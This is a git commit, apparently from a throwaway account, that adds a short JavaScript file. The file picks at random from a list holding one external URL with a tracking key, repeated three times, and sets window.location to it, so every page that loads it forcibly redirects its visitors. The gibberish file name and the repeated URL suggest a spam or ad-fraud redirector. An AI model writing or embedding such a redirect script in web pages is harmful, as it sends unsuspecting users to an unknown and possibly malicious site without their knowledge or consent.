9d60c5fa36cd6c9ae35c5a9055eee8e0c63e9e63
idhoiphiy <idhoiphiy.o@gmail.com>
2026-08-06 20:44:03 +0700

    Create akeadsmingg222.js

---
+++ akeadsmingg222.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://hogencounter.com/n3ab9hppum?key=50e2ebcf42b89de7cbc9b155c8f72787',
+'https://hogencounter.com/n3ab9hppum?key=50e2ebcf42b89de7cbc9b155c8f72787',
+'https://hogencounter.com/n3ab9hppum?key=50e2ebcf42b89de7cbc9b155c8f72787'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
